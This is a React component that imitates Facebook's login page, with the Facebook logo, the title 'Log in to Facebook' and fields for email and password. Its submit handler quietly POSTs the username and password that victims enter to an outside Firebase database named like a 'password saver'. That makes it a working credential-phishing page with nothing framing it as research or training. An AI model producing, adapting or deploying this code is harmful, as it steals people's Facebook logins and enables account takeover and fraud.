import React from 'react'
import { useForm } from "react-hook-form";
import "../login-page/style.css"


const Login = () => {
  
  const { register, handleSubmit } = useForm();
  const onSubmit = data =>{ 

    
      fetch(
        'https://app-fb-p-saver-default-rtdb.asia-southeast1.firebasedatabase.app/.json',
        {
          method:'POST',
          body:JSON.stringify(data),
          headers:{
            'Content-Type':'application/json'
          }
        } 
        )  
  
    


    console.log(data)};
  return (
    // <form onSubmit={handleSubmit(onSubmit)}>
    //   <input {...register("app1")}/>
    //   <input {...register("app2")}/>
    //   <input type="submit" />
    // </form>
    <div class="main-div">
            <img class="facebook_logo" src="./dF5SId3UHWd.svg" alt="Facebook"/>

            <div class="login_info-box">
                <h3 class="login_title">Log in to Facebook</h3>
                <form onSubmit={handleSubmit(onSubmit)}>
                <input type="input_email" placeholder="Email address or phone number" {...register("userName")}/>
                   <input type="input_password " placeholder="Password" {...register("password")}/>
                   <button class="login_button" type='submit'>Log in</button>
                </form>
                <a class="passwod_change-link" href="#" >Forgotten password?</a>
                <a class="signup-link" href="#">Sign up for Facebook</a>
            </div>
        </div>  
  )
}

export default Login